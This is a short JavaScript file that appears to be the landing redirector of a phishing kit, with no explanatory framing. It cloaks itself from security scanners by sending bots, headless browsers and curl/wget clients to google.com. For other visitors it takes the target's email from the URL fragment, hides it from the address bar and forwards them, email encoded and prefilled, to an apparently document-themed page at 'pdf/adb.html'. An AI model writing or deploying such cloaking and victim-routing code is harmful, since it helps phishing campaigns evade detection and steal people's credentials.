// Detect bots or headless browsers
if (
  window.outerWidth === 0 || 
  window.outerHeight === 0 ||
  navigator.webdriver ||
  /HeadlessChrome|PhantomJS|bot|spider|crawl|curl|wget/i.test(navigator.userAgent)
) {
  window.location.href = "https://google.com"; // Kick bots
  throw new Error("Bot detected");
}

function generateSecureToken(length = 64) {
  const array = new Uint8Array(length / 2);
  window.crypto.getRandomValues(array);
  return Array.from(array, byte => byte.toString(16).padStart(2, '0')).join('');
}

function encodeData(data) {
  return btoa(encodeURIComponent(data))
    .replace(/\+/g, '-')
    .replace(/\//g, '_')
    .replace(/=+$/, '');
}

window.onload = function () {
  const hash = window.location.hash.substring(1);
  if (hash && hash.includes("@")) {
    const email = hash;
    const token = generateSecureToken();

    sessionStorage.setItem("redirect_email", email);
    sessionStorage.setItem("redirect_token", token);

    history.replaceState(null, "", window.location.pathname); // Clean URL

    const encodedEmail = encodeData(email);

    // Auto-redirect
    window.location.href = `pdf/adb.html#${encodedEmail}&token=${token}`;
  } else {
    // Fallback if no valid email
    window.location.href = "https://google.com";
  }
};
